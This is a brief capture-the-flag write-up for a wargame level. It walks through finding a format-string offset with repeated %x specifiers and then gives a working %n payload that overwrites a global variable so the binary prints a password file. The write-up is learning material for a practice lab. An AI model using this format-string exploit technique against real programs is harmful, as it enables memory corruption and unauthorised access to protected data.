[See detailed writeup here 3](../../level3/resources/level3.md)

We proceeded in the same way as the previous level3.
We noticed a few small differences here.
```
    if (m == 0x1025544) {
        system("/bin/cat /home/user/level5/.pass");
    }
```

Since our m value is a large number like **16930116**, the same method we did in level3 did not work directly. Because it is not possible to write such a large value with %c, instead we used a better option like %d.

When it comes to finding offsets

```
echo "AAAA%1\$x.%2\$x.%3\$x.%4\$x.%5\$x.%6\$x.%7\$x.%8\$x.%9\$x.%10\$x.%11\$x.%12\$x.%13\$x.%14\$x" | ./level4
```

We have seen that the offset is at 12.

so we will perform the attack as follows;

```
(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'; cat) | ./level4
```
